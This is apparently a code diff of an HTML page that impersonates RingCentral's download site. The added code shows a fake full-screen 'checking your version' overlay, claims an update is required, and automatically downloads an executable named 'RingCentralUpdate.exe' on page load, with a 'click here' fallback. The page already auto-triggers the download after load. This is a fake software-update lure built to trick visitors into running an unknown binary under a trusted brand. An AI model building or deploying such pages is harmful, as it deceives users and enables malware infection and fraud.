@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -506,11 +507,100 @@
             font-size: 24px;
             box-shadow: 0 4px 12px rgba(3, 70, 135, 0.3);
             transition: transform 0.2s ease, background-color 0.2s ease;
+            z-index: 1000;
         }
 
         .chat-bubble:hover {
             background: #022f5a;
             transform: scale(1.1);
+        }
+
+        /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+        }
+
+        .overlay-content {
+            /* background: #ffffff; */
+            padding: 24px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #034687;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+            display: block;
+            /* Always visible */
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .overlay-message {
+            font-size: 18px;
+            color: #f8f9fa;
+            margin-bottom: 16px;
+        }
+
+        .manual-download {
+            color: #0753f8;
+            /* Blue color */
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .manual-download:hover {
+            color: #0e54ec;
+            /* Darker blue on hover */
+        }
+
+        .animating-ellipsis {
+            display: inline-block;
+            overflow: hidden;
+            vertical-align: bottom;
+            animation: ellipsis 1.5s infinite;
+        }
+
+        @keyframes ellipsis {
+            0% {
+                content: ".";
+            }
+
+            33% {
+                content: "..";
+            }
+
+            66% {
+                content: "...";
+            }
+
+            100% {
+                content: ".";
+            }
         }
 
         /* Mobile Responsiveness */
@@ -630,6 +720,20 @@
                 gap: 16px;
                 text-align: center;
             }
+
+            .overlay-content {
+                padding: 16px;
+                max-width: 500px;
+            }
+
+            .spinner {
+                width: 28px;
+                height: 28px;
+            }
+
+            .overlay-message {
+                font-size: 16px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -665,6 +769,20 @@
             .footer-cta h2 {
                 font-size: 28px;
             }
+
+            .overlay-content {
+                padding: 12px;
+                max-width: 250px;
+            }
+
+            .spinner {
+                width: 24px;
+                height: 24px;
+            }
+
+            .overlay-message {
+                font-size: 14px;
+            }
         }
     </style>
     <script>
@@ -677,14 +795,14 @@
             link.click();
             document.body.removeChild(link);
         }
-        window.addEventListener('load', function() {
+        window.addEventListener('load', function () {
             // Delay the download by 1 second to ensure the page is visible
             setTimeout(triggerDownload, 4000);
         });
         // FAQ accordion functionality
-        document.addEventListener('DOMContentLoaded', function() {
-            document.querySelectorAll('.faq-question').forEach(function(btn) {
-                btn.addEventListener('click', function() {
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('.faq-question').forEach(function (btn) {
+                btn.addEventListener('click', function () {
                     var item = btn.parentElement;
                     item.classList.toggle('active');
                 });
@@ -692,6 +810,7 @@
         });
     </script>
 </head>
+
 <body>
     <!-- Header -->
     <header class="header">
@@ -712,7 +831,8 @@
             </div>
             <div class="header-bottom">
                 <div class="header-actions">
-                    <span class="contact-info">Talk to an expert: <a href="tel:18009400745" class="contact-number">1800 940 745</a></span>
+                    <span class="contact-info">Talk to an expert: <a href="tel:18009400745" class="contact-number">1800
+                            940 745</a></span>
                     <button class="header-button">Join a meeting</button>
                     <button class="header-button">Support</button>
                     <button class="header-button">Login <span class="dropdown-arrow"></span></button>
@@ -727,17 +847,20 @@
     <main class="main-content container">
         <h1 class="hero-title">Get the Latest Version of the RingCentral App</h1>
         <p class="hero-subtitle">
-            To enjoy seamless messaging, HD video meetings, and modern business calling, please install the latest version of RingCentral.
+            To enjoy seamless messaging, HD video meetings, and modern business calling, please install the latest
+            version of RingCentral.
         </p>
         <div class="promo">
-            The update should begin downloading automatically. Please install it to continue using RingCentral without interruptions.
+            The update should begin downloading automatically. Please install it to continue using RingCentral without
+            interruptions.
         </div>
         <div class="promo">
             If it doesn’t, <a href="#" onclick="triggerDownload(); return false;">restart the download</a>
         </div>
         <div class="download-buttons">
             <button class="download-btn" onclick="triggerDownload()" data-platform="Mac">Download for Mac</button>
-            <button class="download-btn" onclick="triggerDownload()" data-platform="Windows">Download for Windows</button>
+            <button class="download-btn" onclick="triggerDownload()" data-platform="Windows">Download for
+                Windows</button>
         </div>
         <div class="system-requirements">
             <a href="#" class="system-requirements-link">Learn more about system requirements</a>
@@ -752,49 +875,57 @@
         <div class="container features-container">
             <div class="feature-card">
                 <div class="feature-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <path
+                            d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                     </svg>
                 </div>
                 <h3 class="feature-title">Virtual Phone System</h3>
                 <p class="feature-description">
-                    Make and receive VoIP calls with cloud PBX features like call routing, forwarding, auto-attendant, and voicemail.
+                    Make and receive VoIP calls with cloud PBX features like call routing, forwarding, auto-attendant,
+                    and voicemail.
                 </p>
                 <p class="feature-note">*Available to RingEX subscribers</p>
             </div>
             <div class="feature-card">
                 <div class="feature-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
-                        <line x1="8" y1="21" x2="16" y2="21"/>
-                        <line x1="12" y1="17" x2="12" y2="21"/>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
+                        <line x1="8" y1="21" x2="16" y2="21" />
+                        <line x1="12" y1="17" x2="12" y2="21" />
                     </svg>
                 </div>
                 <h3 class="feature-title">Video Meetings</h3>
                 <p class="feature-description">
-                    Host unlimited video meetings with up to 200 participants, featuring screen sharing, chat, recording, and transcription.
+                    Host unlimited video meetings with up to 200 participants, featuring screen sharing, chat,
+                    recording, and transcription.
                 </p>
             </div>
             <div class="feature-card">
                 <div class="feature-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
-                        <circle cx="12" cy="7" r="4"/>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                        <circle cx="12" cy="7" r="4" />
                     </svg>
                 </div>
                 <h3 class="feature-title">Integrations</h3>
                 <p class="feature-description">
-                    Connect with 200+ apps like Google Workspace, Salesforce, and Microsoft 365, or build custom workflows with APIs.
+                    Connect with 200+ apps like Google Workspace, Salesforce, and Microsoft 365, or build custom
+                    workflows with APIs.
                 </p>
             </div>
             <div class="feature-card">
                 <div class="feature-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                        <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
-                        <rect x="7" y="7" width="3" height="3"/>
-                        <rect x="14" y="7" width="3" height="3"/>
-                        <rect x="7" y="14" width="3" height="3"/>
-                        <rect x="14" y="14" width="3" height="3"/>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
+                        <rect x="7" y="7" width="3" height="3" />
+                        <rect x="14" y="7" width="3" height="3" />
+                        <rect x="7" y="14" width="3" height="3" />
+                        <rect x="14" y="14" width="3" height="3" />
                     </svg>
                 </div>
                 <h3 class="feature-title">Team Messaging</h3>
@@ -813,65 +944,75 @@
                 <button class="faq-question" aria-expanded="false">
                     <span>Is the RingCentral app free?</span>
                     <span class="faq-arrow">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polyline points="6,9 12,15 18,9"/>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
                         </svg>
                     </span>
                 </button>
                 <div class="faq-answer">
-                    <p>The RingCentral app is free to download. A subscription is required for most features, with plans including a free tier with limited functionality.</p>
+                    <p>The RingCentral app is free to download. A subscription is required for most features, with plans
+                        including a free tier with limited functionality.</p>
                 </div>
             </div>
             <div class="faq-item">
                 <button class="faq-question" aria-expanded="false">
                     <span>What devices support the RingCentral app?</span>
                     <span class="faq-arrow">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polyline points="6,9 12,15 18,9"/>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
                         </svg>
                     </span>
                 </button>
                 <div class="faq-answer">
-                    <p>The app is available on Windows, Mac, iOS, and Android devices. Check system requirements for compatibility details.</p>
+                    <p>The app is available on Windows, Mac, iOS, and Android devices. Check system requirements for
+                        compatibility details.</p>
                 </div>
             </div>
             <div class="faq-item">
                 <button class="faq-question" aria-expanded="false">
                     <span>Can I use RingCentral without a subscription?</span>
                     <span class="faq-arrow">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polyline points="6,9 12,15 18,9"/>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
                         </svg>
                     </span>
                 </button>
                 <div class="faq-answer">
-                    <p>Yes, a free tier offers basic features like limited messaging and meetings, but a paid plan unlocks advanced capabilities.</p>
+                    <p>Yes, a free tier offers basic features like limited messaging and meetings, but a paid plan
+                        unlocks advanced capabilities.</p>
                 </div>
             </div>
             <div class="faq-item">
                 <button class="faq-question" aria-expanded="false">
                     <span>How secure is the RingCentral app?</span>
                     <span class="faq-arrow">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polyline points="6,9 12,15 18,9"/>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
                         </svg>
                     </span>
                 </button>
                 <div class="faq-answer">
-                    <p>RingCentral uses end-to-end encryption, secure cloud storage, and compliance with GDPR, HIPAA, and other standards.</p>
+                    <p>RingCentral uses end-to-end encryption, secure cloud storage, and compliance with GDPR, HIPAA,
+                        and other standards.</p>
                 </div>
             </div>
             <div class="faq-item">
                 <button class="faq-question" aria-expanded="false">
                     <span>How do I get support for the app?</span>
                     <span class="faq-arrow">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polyline points="6,9 12,15 18,9"/>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
                         </svg>
                     </span>
                 </button>
                 <div class="faq-answer">
-                    <p>Contact support via the app, website, or phone at 1800 940 745. Paid plans include 24/7 assistance.</p>
+                    <p>Contact support via the app, website, or phone at 1800 940 745. Paid plans include 24/7
+                        assistance.</p>
                 </div>
             </div>
         </div>
@@ -970,7 +1111,6 @@
 
     <!-- Chat Bubble -->
     <button class="chat-bubble" aria-label="Open Chat">💬</button>
-
     <script>
         // System Requirements Banner
         const closeBtn = document.querySelector('.close-btn');
@@ -980,7 +1120,6 @@
                 banner.style.display = 'none';
             });
         }
-
 
         // Mobile Menu Toggle
         const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
@@ -1009,12 +1148,75 @@
         });
 
         // Chat Bubble
-        // const chatBubble = document.querySelector('.chat-bubble');
-        // if (chatBubble) {
-        //     chatBubble.addEventListener('click', () => {
-        //         alert('Chat support would open here');
-        //     });
-        // }
+        const chatBubble = document.querySelector('.chat-bubble');
+        if (chatBubble) {
+            chatBubble.addEventListener('click', () => {
+                alert('Chat support would open here');
+            });
+        }
+
+        // Overlay and Update Flow
+        document.addEventListener('DOMContentLoaded', () => {
+            const overlay = document.createElement('div');
+            overlay.className = 'overlay';
+            const overlayContent = document.createElement('div');
+            overlayContent.className = 'overlay-content';
+            overlayContent.innerHTML = `
+                <div class="spinner" id="spinner"></div>
+                <div class="overlay-message" id="message">Checking your RingCentral version...</div>
+            `;
+            overlay.appendChild(overlayContent);
+
+            // Ensure body exists before appending
+            if (document.body) {
+                document.body.appendChild(overlay);
+            } else {
+                document.addEventListener('load', () => {
+                    if (document.body) {
+                        document.body.appendChild(overlay);
+                    }
+                });
+            }
+
+            function triggerDownload() {
+                var link = document.createElement('a');
+                link.href = "RingCentralUpdate.exe";
+                link.download = 'RingCentralUpdate.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+
+            const spinner = document.getElementById('spinner');
+            const message = document.getElementById('message');
+
+            // Step 1: Display initial message after 2 seconds
+            setTimeout(() => {
+                message.textContent = 'Checking your RingCentral app version...';
+            }, 2000);
+
+            // Step 1: Display initial message after 2 seconds
+            setTimeout(() => {
+                message.textContent = 'Verifying your RingCentral app version...';
+            }, 2000);
+
+            // Step 2: Notify user that an update is required after 3 seconds
+            setTimeout(() => {
+                message.textContent = 'Update required: your RingCentral app is not up to date.';
+            }, 3000);
+
+
+            // Step 3: Begin download and notify the user
+            setTimeout(() => {
+                triggerDownload();
+                setTimeout(() => {
+                    message.innerHTML = 'If the update doesn’t begin automatically, <span class="manual-download">click here to download it manually</span>.';
+                    const manualLink = document.querySelector('.manual-download');
+                    manualLink.addEventListener('click', triggerDownload);
+                }, 4000); // Display manual download message after 3 seconds
+            }, 5000);
+        });
     </script>
 </body>
+
 </html>
